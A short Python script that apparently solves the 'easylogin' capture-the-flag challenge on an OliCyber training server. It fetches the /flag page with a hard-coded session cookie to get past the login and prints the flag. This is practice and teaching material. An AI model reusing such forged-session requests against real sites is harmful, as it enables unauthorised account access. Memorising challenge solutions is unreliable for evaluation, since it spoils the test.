#!/usr/bin/env python3

import logging
import os

import requests

logging.disable()

URL = os.environ.get("URL", "http://easylogin.challs.olicyber.it")
if URL.endswith("/"):
    URL = URL[:-1]

r = requests.get(f'{URL}/flag', cookies={'session': 'd6f816cd031715f733539affe057b5103530c23ff9aa01c5c4e71990ac2ae2ac'})
r.raise_for_status()

print(r.text)
